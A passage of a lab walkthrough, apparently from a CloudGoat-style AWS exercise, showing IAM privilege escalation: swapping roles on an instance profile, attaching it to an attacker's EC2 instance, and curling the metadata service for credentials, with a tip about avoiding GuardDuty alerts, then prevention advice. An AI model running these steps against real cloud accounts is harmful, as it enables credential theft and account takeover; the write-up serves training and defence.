+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ssh -i ~/.ssh/totes-legit ubuntu@18.232.65.212
+</span></span></code></pre></td></tr></table></div></div><p>Now we can query the meta data service and extract the instance keys, or we could run commands directly through this ec2. Lets grab the keys.</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>curl http://169.254.169.254/latest/meta-data/iam/
+</span></span></code></pre></td></tr></table></div></div><p>Weird, looking at the output below we get a 404 error and no access keys. What could cause that?</p><p><img src=images/404-iam.png alt=404_iam class=img-fluid></p><hr><h3 id=more-power>More Power</h3><p>Looking back at what we&rsquo;ve done.</p><ul><li>We found an instance profile</li><li>We disassociated a role with the instance profile</li><li>We associated a new role with the instance profile</li><li>We created an ec2 instance that we have access to.</li></ul><p>Something we have not done yet, associate an instance profile with our instance. This profile is how our instance gains privileges. Remeber, an ec2 can have an instance profile associated with it. That profile can have 1 role associated with it, and that role can have policies attached to it.</p><p>Lets assign a profile to our instance. We&rsquo;ll need our <code>instance Id</code>, and the <code>meek-instance</code> profile name we discovered earlier.</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>aws --profile kerrigan ec2 associate-iam-instance-profile --instance-id<span style=color:#2c5dcd>=</span>i-06f3f5f9f8cdc9c6e --iam-instance-profile Name<span style=color:#2c5dcd>=</span>cg-ec2-meek-instance-profile-cgidawtm15fqxm
+</span></span></code></pre></td></tr></table></div></div><p>Once the command is executed we&rsquo;ll see an output similar to the one below with a state of <code>associating</code></p><p><img src=images/associate-profile.png alt=associate_profile class=img-fluid></p><p>After a minute or two we can check back in on our instsance and attempt to curl for credentials again:</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>curl http://169.254.169.254/latest/meta-data/iam/
+</span></span></code></pre></td></tr></table></div></div><p>The output has changed, from a 404 error to the one below.</p><p><img src=images/curl-iam.png alt=curl_iam class=img-fluid></p><p>Digging deeper into the meta data we can find an AccessKey, SecretAcessKey, and a Token needed to access the aws api</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>curl http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-mighty-role-cgidawtm15fqxm
+</span></span></code></pre></td></tr></table></div></div><p><img src=images/access-key.png alt=access_key class=img-fluid></p><p>We have a few options at this point:</p><ul><li>Take the access key information and run aws cli commands from our workstation</li><li>Install/use the aws cli on the instance we control to run commands</li><li>Use the pacu proxy</li></ul><p>Each of these has there own benefits and draw backs. If we steal the keys and use them locally, we run the risk of triggering Guard Duty. We could spin up an ec2 in our own account to prevent Guard Duty from alerting, but thats not necessary for this walkthrough. If we install the aws cli and issue commands we run the risk of losing access to the box. The same issue presents itself if we use the Pacu proxy.</p><p>We&rsquo;ll go ahead and run the risk of losing access, and install the aws cli on our instance.</p><p>Once its install we can validate that we have working credentials:</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sts get-caller-identity
+</span></span></code></pre></td></tr></table></div></div><p><img src=images/ec2-whoami.png alt=ec2_whoami class=img-fluid></p><p>Perfect we have no pivoted from the <code>kerrigan</code> user to whatever permissions we have through the new mighty role. We should use our new abilities to see if we can determine the full extent of the <code>mighty</code> role.</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>aws iam list-attached-role-policies --role-name<span style=color:#2c5dcd>=</span>cg-ec2-mighty-role-cgidawtm15fqxm
+</span></span></code></pre></td></tr></table></div></div><p>and thankfully, it looks like we have some measure of IAM privileges because the output from that command shows us the policy associated with the role:</p><p><img src=images/mighty-policies.png alt=mighty_polices class=img-fluid>
+Perhaps we have the ability to also see the configuration of that policy. Fist we&rsquo;ll pull in some general information about the policy:</p><pre tabindex=0><code>aws iam get-policy --policy-arn=arn:aws:iam:::policy/cg-ec2-mighty-policy
+</code></pre><p><img src=images/policy-version.png alt=policy_version class=img-fluid></p><p>Looking at the output above we are currently using policy version v1.</p><p>We can now get the configuration of the policy with:</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>aws iam get-policy-version --policy-arn<span style=color:#2c5dcd>=</span>arn:aws:iam:::policy/cg-ec2-mighty-policy --version-id<span style=color:#2c5dcd>=</span>v1
+</span></span></code></pre></td></tr></table></div></div><p><img src=images/policy.png alt=policy class=img-fluid></p><p>The output shows that we can take any action Action: * and we can access any resource Resource: *. Through this ec2 instance with the mighty role we are effectivly and administrator within this account. We can do anything that we would like.</p><hr><h3 id=prevention>Prevention</h3><p>So, how do we prevent this. Where did the owner of this account go wrong? There are a few places where this could have be stopped. Lets dive into them.</p><ol><li>The first and probably the biggest is does the Kerrigan user need a static key? If they could be switched to temorary ephemeral keys it would greatly reduce the liklihood that if an attacker found the keys that they would still be valid. In this scenario specifically if we did not have the Kerrigan access key then this attack would have failed right out of gate.</li><li>Does Kerrigan need this level of access? Looking at the policy:</li></ol><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
+</span></span><span style=display:flex><span> <span style=color:#2c5dcd;font-weight:700>&#34;Version&#34;</span>: <span style=color:#0c6>&#34;2012-10-17&#34;</span>,
+</span></span><span style=display:flex><span> <span style=color:#2c5dcd;font-weight:700>&#34;Statement&#34;</span>: [
+</span></span><span style=display:flex><span>  {
+</span></span><span style=display:flex><span>   <span style=color:#2c5dcd;font-weight:700>&#34;Sid&#34;</span>: <span style=color:#0c6>&#34;VisualEditor0&#34;</span>,
+</span></span><span style=display:flex><span>   <span style=color:#2c5dcd;font-weight:700>&#34;Effect&#34;</span>: <span style=color:#0c6>&#34;Allow&#34;</span>,
+</span></span><span style=display:flex><span>   <span style=color:#2c5dcd;font-weight:700>&#34;Action&#34;</span>: [
+</span></span><span style=display:flex><span>    <span style=color:#0c6>&#34;iam:ListRoles&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#0c6>&#34;iam:PassRole&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#0c6>&#34;iam:ListInstanceProfiles&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#0c6>&#34;iam:AddRoleToInstanceProfile&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#0c6>&#34;iam:RemoveRoleFromInstanceProfile&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#0c6>&#34;ec2:AssociateIamInstanceProfile&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#0c6>&#34;ec2:DescribeIamInstanceProfileAssociations&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#0c6>&#34;ec2:RunInstances&#34;</span>
+</span></span><span style=display:flex><span>   ],
+</span></span><span style=display:flex><span>   <span style=color:#2c5dcd;font-weight:700>&#34;Resource&#34;</span>: <span style=color:#0c6>&#34;*&#34;</span>
+</span></span><span style=display:flex><span>  },
+</span></span><span style=display:flex><span>  {
+</span></span><span style=display:flex><span>   <span style=color:#2c5dcd;font-weight:700>&#34;Sid&#34;</span>: <span style=color:#0c6>&#34;VisualEditor1&#34;</span>,
+</span></span><span style=display:flex><span>   <span style=color:#2c5dcd;font-weight:700>&#34;Effect&#34;</span>: <span style=color:#0c6>&#34;Allow&#34;</span>,
+</span></span><span style=display:flex><span>   <span style=color:#2c5dcd;font-weight:700>&#34;Action&#34;</span>: <span style=color:#0c6>&#34;ec2:CreateKeyPair&#34;</span>,
+</span></span><span style=display:flex><span>   <span style=color:#2c5dcd;font-weight:700>&#34;Resource&#34;</span>: <span style=color:#0c6>&#34;*&#34;</span>
+</span></span><span style=display:flex><span>  },
+</span></span><span style=display:flex><span>  {
+</span></span><span style=display:flex><span>   <span style=color:#2c5dcd;font-weight:700>&#34;Action&#34;</span>: [
+</span></span><span style=display:flex><span>    <span style=color:#0c6>&#34;ec2:DescribeInstances&#34;</span>,<span style=color:#0c6>&#34;ec2:DescribeVpcs&#34;</span>, <span style=color:#0c6>&#34;ec2:DescribeSubnets&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#0c6>&#34;ec2:DescribeSecurityGroups&#34;</span>
+</span></span><span style=display:flex><span>   ],
+</span></span><span style=display:flex><span>  <span style=color:#2c5dcd;font-weight:700>&#34;Effect&#34;</span>: <span style=color:#0c6>&#34;Allow&#34;</span>,
+</span></span><span style=display:flex><span>  <span style=color:#2c5dcd;font-weight:700>&#34;Resource&#34;</span>: <span style=color:#0c6>&#34;*&#34;</span>
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  ]
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></td></tr></table></div></div><p>This policy grants a lot of access, and a lot of it probably isnt necessary. The iam permissions could probably go away. But, perhaps they&rsquo;re needed for an automation. What if the kerrigan keys are designed to spin up Ec2 instances, each has there own unique ssh key, and each need to have the same Instance profile associated with it so that it can access S3. If thats the case some of these permissions make sense. But we could still remove <code>ListRoles, PassRole, ListInstanceProfiles, RemoveRoleFromInstanceProfile, DescribeiamInstanceProfileAssociations</code>. These permissions were critical for us to be able to pivot from Kerrigan to an instance with mighty permissions.</p><ol start=3><li>The mighty role should probably just not exist at all. This would be an interesting discussion with the stakeholders to understand the purpose of this role. Perhaps there is a valid reason for it, but more than likely this could have permissions scoped in and not given full administrative rights to the account.</li><li>Proper detections could also help. While they might not prevent the entire attack, they may help to slow everything down. If the Cloudtrail logs were baselined, and examined our activities would probably stick out. Our enumeration was very loud, we made hundereds of calls over a short period of time. Additionally we probably made calls that the Kerrigan never makes. This would allow a SOC to have a heads up of the malicious activity and begin investigating.</li></ol></div></div><div class=col-md-3 id=sidebar data-spy=affix-bottom data-offset-top=0><nav class="post-sidebar hidden-print hidden-sm hidden-xs affix sticky" id=post-nav><h5>contents</h5><ul class="nav post-sidenav"><li><nav id=TableOfContents><ul><li><a href=#whoami>whoami</a><ul><li><a href=#what-can-i-do>What can I do?</a></li><li><a href=#more-enumeration>More Enumeration</a></li><li><a href=#make-an-ec2>Make an ec2</a></li><li><a href=#more-power>More Power</a></li><li><a href=#prevention>Prevention</a></li></ul></li></ul></nav></li></ul></nav></div></div></div></div><footer></footer></body><script src=https://code.jquery.com/jquery-3.3.1.slim.min.js integrity=sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo crossorigin=anonymous></script>
 <script src=https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js integrity=sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1 crossorigin=anonymous></script>
 <script src=https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js integrity=sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM crossorigin=anonymous></script>
-<script>includeHTML()</script>
-</html>
+<script>includeHTML()</script></html>
